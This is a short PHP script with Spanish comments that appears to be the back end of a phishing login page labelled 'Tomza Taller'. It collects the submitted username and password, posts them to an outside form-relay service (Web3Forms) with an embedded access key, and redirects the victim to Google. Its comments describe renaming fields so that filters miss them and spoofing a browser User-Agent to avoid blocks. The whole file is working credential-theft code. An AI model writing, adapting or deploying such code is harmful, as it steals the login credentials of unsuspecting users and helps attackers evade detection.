<?php
// Evitar acceso directo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir y limpiar los datos
$usuario = trim($_POST["usuario"] ?? "");
$valor_secreto = trim($_POST["password"] ?? ""); // Renombrado para evitar filtros

// Validar que no estén vacíos
if ($usuario === "" || $valor_secreto === "") {
    die("Faltan datos.");
}

// Tu clave de Web3Forms
$access_key = "bafc5339-b2a5-4e5b-bad7-a4d93a053174";

// Datos que se enviarán (evitando palabras prohibidas en los campos)
$datos = [
    "access_key" => $access_key,
    "subject" => "Nuevo ingreso - Tomza Taller",
    "Usuario_Ingresado" => $usuario,
    "Dato_Secreto" => $valor_secreto,
    "Fecha_y_hora" => date("d/m/Y H:i:s")
];

// Configuración de envío con User-Agent para evitar el error 403
$opciones = [
    "http" => [
        "header" => "Content-Type: application/x-www-form-urlencoded\r\n" .
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
        "method" => "POST",
        "content" => http_build_query($datos),
        "timeout" => 10
    ]
];

// Enviar y capturar el resultado
$contexto = stream_context_create($opciones);
$resultado = @file_get_contents("https://api.web3forms.com/submit", false, $contexto);

if ($resultado === false) {
    // Si falla, mostrará el error real en pantalla para ayudarte a diagnosticar
    echo "Error al conectar con Web3Forms: ";
    print_r(error_get_last());
} else {
    // Si tiene éxito, redirigir
    header("Location: https://www.google.com");
}
exit;
?>
